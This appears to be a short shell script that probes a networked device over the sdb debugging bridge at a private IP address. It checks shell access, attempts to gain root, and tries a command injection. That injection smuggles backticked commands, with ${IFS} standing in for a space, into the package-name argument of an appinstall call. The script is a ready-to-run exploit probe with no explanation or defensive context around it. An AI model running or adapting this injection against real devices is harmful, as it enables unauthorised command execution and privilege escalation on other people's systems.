/w/data/tools/sdb connect 192.168.0.85:26101
echo "== devices =="
/w/data/tools/sdb devices
echo "== shell probe =="
/w/data/tools/sdb -s 192.168.0.85:26101 shell id </dev/null 2>&1 | head -5
echo "== root probe =="
/w/data/tools/sdb -s 192.168.0.85:26101 root on 2>&1 | head -3
echo "== injection: id; uname -a =="
/w/data/tools/sdb -s 192.168.0.85:26101 shell '0 appinstall tpk x`id;uname${IFS}-a`.tpk' </dev/null 2>&1 | head -20
